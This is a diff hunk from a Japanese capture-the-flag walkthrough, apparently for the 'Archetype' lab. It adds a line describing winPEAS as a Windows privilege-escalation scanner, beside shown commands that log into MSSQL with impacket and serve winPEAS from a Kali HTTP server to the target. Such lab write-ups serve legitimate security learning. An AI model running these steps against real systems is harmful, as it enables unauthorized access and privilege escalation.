@@ -217,7 +217,7 @@ MSSQL サーバ（TCP 1433）へログインして、SQL クエリを実行で�
 python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 ```
 ## winPEAS
-
+Windows 環境における権限昇格の可能性を自動で調査するためのツール
 #### 1. Kaliなどから Windows に winPEAS をアップロード
 ```
 python3 -m http.server 80  # Kali側
